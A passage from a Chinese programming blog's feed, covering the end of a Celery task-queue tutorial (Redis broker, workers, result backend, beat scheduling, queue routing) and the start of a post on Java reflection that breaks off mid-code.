r.lpush(<span class="string">"task_list"</span>,json.dumps(new_task))</span><br><span class="line">        time.sleep(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">worker</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"worker开始工作"</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        task = json.loads(r.brpop(<span class="string">"task_list"</span>)[<span class="number">1</span>])</span><br><span class="line">        print(task)</span><br><span class="line">        task_id = task[<span class="string">'task_id'</span>]</span><br><span class="line">        random_num = task[<span class="string">'random_num'</span>]</span><br><span class="line">        num_md5 = get_md5(random_num)</span><br><span class="line">        result = &#123;<span class="string">'task_id'</span>:task_id,<span class="string">'result'</span>:num_md5&#125;</span><br><span class="line">        r.set(task_id,json.dumps(result))</span><br><span class="line"></span><br><span class="line">        get_result = json.loads(r.get(task_id))[<span class="string">'result'</span>]</span><br><span class="line">        print(<span class="string">"&#123;&#125; hash is: &#123;&#125;"</span>.format(random_num,get_result))</span><br></pre></td></tr></table></figure><br>如此我们就可以根据任务id获取任务处理结果。</p><h2 id="Celery"><a href="#Celery" class="headerlink" title="Celery"></a>Celery</h2><p>上面讲了很多，是时候谈谈本篇文章的重点，celery。它是一个由python语言实现分布式的任务队列，其中包括以下几个组成部分</p><ul><li>Task。即用户定义的任务部分。</li><li>Broker。即上文所讲的消息中间件，一般采用redis或者rabbitMQ。</li><li>Worker。任务消费者，实时监控任务队列并处理。</li><li>Beat。定时任务调度器，将定时任务发送至broker，等待worker进行处理。</li><li>Backend。即任务执行的结果，worker将任务处理完成后将结果存放于此。</li></ul><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>我们采用pip安装，并采用redis作为消息中间件<br><code>pip install -U &quot;celery[redis]&quot;</code></p><h3 id="第一个celery实例"><a href="#第一个celery实例" class="headerlink" title="第一个celery实例"></a>第一个celery实例</h3><p>这里我们假设要向某api请求搜索数据，这个操作耗时需要10秒以上。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> celery <span class="keyword">import</span> Celery</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">broker = <span class="string">'redis://localhost:6379/0'</span></span><br><span class="line">celery_app = Celery(<span class="string">'main'</span>,broker=broker)</span><br><span class="line"></span><br><span class="line"><span class="meta">@celery_app.task</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_result_from_remote</span><span class="params">(keyword)</span>:</span></span><br><span class="line">    print(<span class="string">"正在搜索关键字为&#123;&#125;的数据"</span>.format(keyword))</span><br><span class="line">    time.sleep(<span class="number">10</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"success"</span></span><br></pre></td></tr></table></figure><br>注意创建celery实例时，第一个参数表示celery app所在的脚本名称，即入口点。<br>接下来我们同样在这个脚本中定义需要调用此任务的函数。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search_from_remote</span><span class="params">()</span>:</span></span><br><span class="line">    keyword = input(<span class="string">"请输入关键字:"</span>)</span><br><span class="line">    start = time.time()</span><br><span class="line">    get_result_from_remote.delay(keyword)</span><br><span class="line">    print(<span class="string">"一共耗时&#123;&#125;秒"</span>.format(time.time()-start))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    search_from_remote()</span><br></pre></td></tr></table></figure> </p><h3 id="worker"><a href="#worker" class="headerlink" title="worker"></a>worker</h3><p>此时我们就可以启动worker监听是否有任务存在于broker中。<br><code>celery worker -A main --loglevel=info</code><br>-A 参数表示celery的任务在哪个脚本当中，然后定义了日志级别。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> -------------- celery@ubuntu v4.4.2 (cliffs)</span><br><span class="line">--- ***** ----- </span><br><span class="line">-- ******* ---- Linux-4.4.0-105-generic-x86_64-with-Ubuntu-16.04-xenial 2020-03-24 21:02:29</span><br><span class="line">- *** --- * --- </span><br><span class="line">- ** ---------- [config]</span><br><span class="line">- ** ---------- .&gt; app:         tasks:0x7f5ba09f8ef0</span><br><span class="line">- ** ---------- .&gt; transport:   redis://localhost:6379/0</span><br><span class="line">- ** ---------- .&gt; results:     disabled://</span><br><span class="line">- *** --- * --- .&gt; concurrency: 1 (prefork)</span><br><span class="line">-- ******* ---- .&gt; task events: OFF (<span class="built_in">enable</span> -E to monitor tasks <span class="keyword">in</span> this worker)</span><br><span class="line">--- ***** ----- </span><br><span class="line"> -------------- [queues]</span><br><span class="line">                .&gt; celery           exchange=celery(direct) key=celery</span><br><span class="line">                </span><br><span class="line"></span><br><span class="line">[tasks]</span><br><span class="line">  . main.get_result_from_remote</span><br><span class="line"></span><br><span class="line">[2020-03-24 21:16:24,764: INFO/MainProcess] Connected to redis://localhost:6379/0</span><br><span class="line">[2020-03-24 21:16:24,804: INFO/MainProcess] mingle: searching <span class="keyword">for</span> neighbors</span><br><span class="line">[2020-03-24 21:16:25,865: INFO/MainProcess] mingle: all alone</span><br><span class="line">[2020-03-24 21:16:25,954: INFO/MainProcess] celery@ubuntu ready.</span><br></pre></td></tr></table></figure><br>由于还没启动生产者，所以worker不进行工作。或者说worker没有工作可做。<br>接着我们运行这个脚本<br><code>python3 main.py</code><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">请输入关键字:123</span><br><span class="line">一共耗时0.3693723678588867秒</span><br></pre></td></tr></table></figure><br>可以发现定义在任务中延时并不会影响主线程运行，再看看worker的日志<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[2020-03-24 21:16:33,985: INFO/MainProcess] Received task: main.get_result_from_remote[1d4196cf-12e2-49be-acf1-0163b1b0d522]  </span><br><span class="line">[2020-03-24 21:16:33,990: WARNING/ForkPoolWorker-1] 正在搜索关键字为123的数据</span><br><span class="line">[2020-03-24 21:16:44,005: INFO/ForkPoolWorker-1] Task main.get_result_from_remote[1d4196cf-12e2-49be-acf1-0163b1b0d522] succeeded <span class="keyword">in</span> 10.015596589073539s: <span class="string">'success'</span></span><br></pre></td></tr></table></figure><br>十分完美，我们成功使用了celery做任务队列来处理耗时操作。</p><h3 id="获取返回结果"><a href="#获取返回结果" class="headerlink" title="获取返回结果"></a>获取返回结果</h3><p>接着我们看看在主线程中，任务的返回值究竟是什么。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search_from_remote</span><span class="params">()</span>:</span></span><br><span class="line">    keyword = input(<span class="string">"请输入关键字:"</span>)</span><br><span class="line">    start = time.time()</span><br><span class="line">    result = get_result_from_remote.delay(keyword)</span><br><span class="line">    print(result)</span><br><span class="line">    print(<span class="string">"一共耗时&#123;&#125;秒"</span>.format(time.time()-start))</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>发现返回了一串类似于任务id的数据.<code>f75232b5-e3be-4a6f-a077-0b7bf9bd8111</code><br>通过查看官方文档，我找到了使用方法<br>第一种办法是通过任务的AsyncResult方法来获取结果：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">task_id = <span class="string">"f75232b5-e3be-4a6f-a077-0b7bf9bd8111"</span></span><br><span class="line">print(get_result_from_remote.AsyncResult(task_id).get())</span><br></pre></td></tr></table></figure><br>另一种方式是通过celery.result的AsyncResult方法：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">task_id = <span class="string">"f75232b5-e3be-4a6f-a077-0b7bf9bd8111"</span></span><br><span class="line"><span class="keyword">from</span> celery.result <span class="keyword">import</span> AsyncResult</span><br><span class="line">AsyncResult(task_id).get()</span><br></pre></td></tr></table></figure> </p><h3 id="添加backend"><a href="#添加backend" class="headerlink" title="添加backend"></a>添加backend</h3><p>但是由于我们没有启动backend，所以无法获取结果。我们依旧把redis当作backend。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">redis_server = <span class="string">'redis://localhost:6379/0'</span></span><br><span class="line">celery_app = Celery(<span class="string">'main'</span>,broker=redis_server,backend=redis_server)</span><br></pre></td></tr></table></figure><br>我们重启worker，运行脚本之后获取任务id的结果<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">task_id = <span class="string">"ed9e6f8a-913f-49a5-a3b6-99444003352a"</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">"result:"</span> + get_result_from_remote.AsyncResult(task_id).get())</span><br><span class="line">from celery.result import AsyncResult</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"result:"</span> + AsyncResult(task_id).get())</span><br><span class="line"><span class="comment">#result:success</span></span><br><span class="line"><span class="comment">#result:success</span></span><br></pre></td></tr></table></figure></p><h3 id="beat"><a href="#beat" class="headerlink" title="beat"></a>beat</h3><p>celery的几个组件就剩下beat。beat组件可以配置自动任务。我们另起一个新脚本。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># mybeat.py</span></span><br><span class="line"><span class="keyword">from</span> celery <span class="keyword">import</span> Celery</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line">redis_server = <span class="string">'redis://localhost:6379/0'</span></span><br><span class="line">celery_app = Celery(<span class="string">'mybeat'</span>,broker=redis_server,backend=redis_server)</span><br><span class="line"></span><br><span class="line">celery_app.conf.beat_schedule = &#123;</span><br><span class="line">    <span class="string">'task-10-seconds'</span>: &#123;</span><br><span class="line">        <span class="string">'task'</span>: <span class="string">'test'</span>,</span><br><span class="line">        <span class="string">'schedule'</span>: datetime.timedelta(seconds=<span class="number">10</span>),</span><br><span class="line">        <span class="string">'args'</span>: (<span class="number">1</span>, <span class="number">1</span>),</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@celery_app.task(name='test')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">(x, y)</span>:</span></span><br><span class="line">    print(<span class="string">'定时任务开始运行'</span>)</span><br><span class="line">    <span class="keyword">return</span> x + y</span><br></pre></td></tr></table></figure></p><p>我们先启动worker进程<code>celery worker -A mybeat -l info</code><br>然后启动beat程序<code>celery beat -A mybeat</code><br>之后每10秒worker就会计算一遍1+1的结果并将结果缓存。</p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>尽管我们初步学习了celery的使用，但其实在项目中celery的配置是较为复杂的，在网上找了几篇文章，celery项目结构普遍为<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">├── __init__.py</span><br><span class="line">├── celeryconfig.py</span><br><span class="line">├── celery.py</span><br><span class="line">└── tasks.py</span><br></pre></td></tr></table></figure>  </p><p>其中celery.py为主程序，作为整个celery的入口点，celeryconfig为配置存放处，而tasks则是各种任务。<br>在本篇文章的代码中，我只是设置了一个任务队列，celery支持多个任务队列，通过设置queue与route，并且制定任务名称，根据名称匹配路由，路由再将任务送至响应的queue中，实现不同类型的任务有不同的任务队列来处理。这里需要使用kombu对queue进行处理。简单给出代码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> celery <span class="keyword">import</span> Celery</span><br><span class="line"><span class="keyword">from</span> kombu <span class="keyword">import</span> Exchange, Queue</span><br><span class="line"><span class="comment">#broker 与 backend可以使用不同的redis数据库，如0和1</span></span><br><span class="line">redis_server = <span class="string">'redis://localhost:6379/0'</span></span><br><span class="line">celery_app = Celery(<span class="string">'celery'</span>,broker=redis_server,backend=redis_server)</span><br><span class="line"></span><br><span class="line"><span class="string">'''使用redis做broker可以无需配置exchange'''</span></span><br><span class="line">queue = (</span><br><span class="line">    Queue(<span class="string">'default'</span>, exchange=Exchange(<span class="string">'default'</span>, type=<span class="string">'direct'</span>), routing_key=<span class="string">'default'</span>),</span><br><span class="line">    Queue(<span class="string">'task1'</span>, exchange=Exchange(<span class="string">'task1'</span>, type=<span class="string">'direct'</span>), routing_key=<span class="string">'task1'</span>),</span><br><span class="line">    Queue(<span class="string">'task2'</span>, exchange=Exchange(<span class="string">'task2'</span>, type=<span class="string">'direct'</span>), routing_key=<span class="string">'task2'</span>),</span><br><span class="line">)</span><br><span class="line">route = &#123;</span><br><span class="line">    <span class="string">'task*'</span>: &#123;<span class="string">'queue'</span>: <span class="string">'task1'</span>, <span class="string">'routing_key'</span>: <span class="string">'task1'</span>&#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">'task2'</span>: &#123;<span class="string">'queue'</span>: <span class="string">'task2'</span>, <span class="string">'routing_key'</span>: <span class="string">'task2'</span>&#125;,</span><br><span class="line">    <span class="string">'*'</span>: &#123;<span class="string">'queue'</span>: <span class="string">'default'</span>, <span class="string">'routing_key'</span>: <span class="string">'default'</span>&#125;,</span><br><span class="line">&#125;</span><br><span class="line">app.conf.update(</span><br><span class="line">    task_serializer=<span class="string">'json'</span>,</span><br><span class="line">    accept_content=[<span class="string">'json'</span>],</span><br><span class="line">    result_serializer=<span class="string">'json'</span>,</span><br><span class="line">    timezone=<span class="string">'Asia/Shanghai'</span>,</span><br><span class="line">    enable_utc=<span class="keyword">False</span>,</span><br><span class="line">    <span class="comment"># 任务过期时间(超时时间)</span></span><br><span class="line">    <span class="comment"># result_expires=3600,</span></span><br><span class="line">    <span class="comment">#  Number of CPU cores.</span></span><br><span class="line">    <span class="comment"># worker_concurrency=4,</span></span><br><span class="line">    task_queues=queue,</span><br><span class="line">    task_routes=route,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">#tasks.py</span></span><br><span class="line"><span class="meta">@app.task(name="task2")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">task2</span><span class="params">(arg)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"celery_task2,执行结果为:&#123;&#125;"</span>.format(arg)</span><br></pre></td></tr></table></figure>  </p><p>通过指定任务的name，celery选择合适的任务队列，如果需要worker配合，则需要使用-Q参数 指定队列的名称<code>celery worker -A tasks -l info -Q task1</code>此时这个worker只会处理这个队列中的任务。<br>但就一个小项目而言，则无需配置queue，将项目简单化，上面的代码就已经够用。</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>至此我们成功完成了一个celery任务队列的模板，包括设置celery实例，添加了消息中间件与消息结果件，并且成功让worker执行。之后设置了beat定时任务，定时执行某些任务。<br>有没有发现，celery与我们所写的任务队列雏形十分相像？如果设置celery的任务与结果序列化方式为json的话，核心逻辑就是我们所写的demo。<br>另外这里需要注意的是，celery4.x在win10存在不兼容问题，所以我采用Ubuntu作为测试环境。</p><h1 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h1><p>这次学习了celery的基本使用方法，这篇文章的知识在简单和中型开发中已然够用。<br>celery虽然在python中很火，但是却无法使用在其他语言中，也限制了它的流行度，官网中的文档只有入门例子才有中文。网上的文章很多讲述地又不是很清楚，因此我总结了这篇文章，希望能更好地了解开发，不仅是代码，更是对架构的理解。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;之前讲过，在自己开发的公众号后台中有一个比较费时的请求操作，由于微信限制5秒内返回，无法立即返回结果，因此我开始寻找解决办法，最终决定使用&lt;
      
    
    </summary>
    
    
      <category term="编程" scheme="http://re0.top/tags/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="python" scheme="http://re0.top/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>理解Java反射</title>
    <link href="http://re0.top/2020/03/22/java-reflection/"/>
    <id>http://re0.top/2020/03/22/java-reflection/</id>
    <published>2020-03-22T08:20:00.000Z</published>
    <updated>2020-03-22T16:08:00.206Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这篇文章鸽了好久，拖稿了好几天，趁着有精力的时候多写写文章。Java语言一直被我认为是常见语言中最难的语言，主要是概念繁多，然后就是JVM的知识点复杂，导致尽管有些人会写代码，但是问到某个知识点却不知道为何是这样。<br>今天谈谈Java中的反射机制。什么是反射呢？反射就是在Java编译期以外的时间可以动态的加载一个类。还可以实例化对象，获取变量，方法等。</p><h1 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h1><h2 id="入门"><a href="#入门" class="headerlink" title="入门"></a>入门</h2><p>上面的概念刚开始我也不是很懂，为什么Java会有反射这种机制呢？假设有以下代码：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cat cat = <span class="keyword">new</span> Cat();</span><br></pre></td></tr></table></figure>  </p><p>JVM编译时会把代码编译成class文件加载到jvm的内存中，以上代码会使Cat.java文件编译成Cat.class然后加载到JVM的内存当中，然后执行new申请内存空间，然后返回实例。这种方法只适合已经知道需要什么对象，而如果在运行的时候才确定了对象，此时已经错过了编译期，所以需要动态地加载一个类，这样的操作我们称作<strong>反射</strong>。<br>那么反射有什么优点与缺点呢？优点就是十分灵活，类的加载无需重新编译，这种思想广泛用在了java生态当中，常见的框架都采用了反射的思想，如spring等。<br>而缺点就是影响性能，不建议使用在普通代码中，并且会使代码逻辑变得模糊，不利于维护。还有一点就是由于反射的功能强大，可以执行一些不被允许的操作（例如获取到类中的私有属性与方法），从而会引发某些问题。</p><h2 id="Class类"><a href="#Class类" class="headerlink" title="Class类"></a>Class类</h2><p>在继续理解前，我们需要了解一下Java中的Class类。Class类是反射的基础。在Java中用来表示运行时类型信息的对应类就是Class类，存在于JDK的java.lang包中。手动编写一个类后，会产生一个Class对象，保存在同名的.class文件中。而这个类无论有多少个实例，内存中只有一个与之对应的Class对象。查看Class类的源码：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="title">Class</span><span class="params">(ClassLoader loader)</span> </span>&#123;</span><br><span class="line">        classLoader = loader;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>我们发现构造器为私有的，只有JVM能够创建Class对象，那么如何获得这个类的Class对象呢？有三种方法：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1</span></span><br><span class="line">Class c1 = Cat.class; <span class="comment">//任何类都有隐含的静态成员class用于获取Class对象</span></span><br><span class="line"><span class="comment">//2</span></span><br><span class="line">Class c2 = cat.getClass();<span class="comment">//实例有一个getClass方法获取Class对象</span></span><br><span class="line"><span class="comment">//3</span></span><br><span class="line">Class c3 = Class.forName(<span class="string">"Cat"</span>);<span class="comment">//Class类中的方法forName传入全量名可以获取这个类的Class对象</span></span><br></pre></td></tr></table></figure><br><strong>而通过Class对象获得类的信息的方法我们就称作反射(Reflection)。</strong></p><h2 id="反射的相关操作"><a href="#反射的相关操作" class="headerlink" title="反射的相关操作"></a>反射的相关操作</h2><h3 id="获取成员方法"><a href="#获取成员方法" class="headerlink" title="获取成员方法"></a>获取成员方法</h3><p>说了这么多，反射具体能做些啥呢？其实具体就以下几种：</p><ul><li>获取方法</li><li>获取属性(变量)</li><li>获取构造函数</li></ul><p>这里我统一使用Class.forName()获取Class对象。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Cat</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> id; <span class="comment">//特意将id设为public，开发中不这么写</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(<span class="keyword">int</span> id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">hello</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="keyword">this</span>.name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">Class cls = Class.forName(<span class="string">"model.Cat"</span>);</span><br><span class="line">        Object o = cls.newInstance();</span><br><span class="line">        Method method = cls.getMethod(<span class="string">"setName"</span>, String.class);</span><br><span class="line">        method.invoke(o,<span class="string">"波斯猫"</span>);</span><br><span class="line">        System.out.println(cls.getMethod(<span class="string">"getName"</span>).invoke(o));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>  </p><p>首先使用Class.forName 获得Class对象，接着使用newInstance生成Cat的实例对象（之后会讲构造器的newInstance和直接的newInstance的区别），<br>使用getMethod可以获取某个方法，接着通过invoke方法传入对象与参数。<br>如果使用getMethods则可以获取所有方法。但是getMethod和getMethods获取的是public方法，如果需要获得私有方法，则使用getDeclaredMethod方法。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Method hello = cls.getDeclaredMethod(<span class="string">"hello"</span>);</span><br><span class="line">hello.setAccessible(<span class="keyword">true</span>); <span class="comment">//需要设置成可访问，才可以访问私有方法</span></span><br><span class="line">hello.invoke(o);</span><br></pre></td></tr></table></figure>  </p><h3 id="获取成员属性"><a href="#获取成员属性" class="headerlink" title="获取成员属性"></a>获取成员属性</h3><p>这里我们只写main方法<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        Class cls = Class.forName(<span class="string">"model.Cat"</span>);</span><br><span class="line">        Object o = cls.newInstance();</span><br><span class="line">        Method method1 = cls.getMethod(<span class="string">"setId"</span>, <span class="keyword">int</span>.class);</span><br><span class="line">        method1.invoke(o,<span class="number">1</span>);</span><br><span class="line">        Method method2 = cls.getMethod(<span class="string">"setName"</span>, String.class);</span><br><span class="line">        method2.invoke(o,<span class="string">"哈士奇"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取成员属性</span></span><br><span class="line">        Field field = cls.getField(<span class="string">"id"</span>);</span><br><span class="line">        System.out.println(<span class="string">"id: "</span> + field.get(o));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取成员private属性</span></span><br><span class="line">        Field field1 = cls.getDeclaredField(<span class="string">"name"</span>);</span><br><span class="line">        field1.setAccessible(<span class="keyword">true</span>);<span class="comment">//依旧需要设置成可访问</span></span><br><span class="line">        System.out.println(<span class="string">"name: "</span> + field1.get(o));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>  </p><h3 id="获取构造函数"><a href="#获取构造函数" class="headerlink" title="获取构造函数"></a>获取构造函数</h3><p>反射还可以获取类的构造函数。在这之前，有一个之前说的问题，Class的newInstance和构造器的newInstance有什么差。其实他们的区别在于Class的newInstance方法只能创建无参数构造函数的类的实例，而构造器的newInstance方法则可以创建带有参数的类的实例。<br>我们另写两个类<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 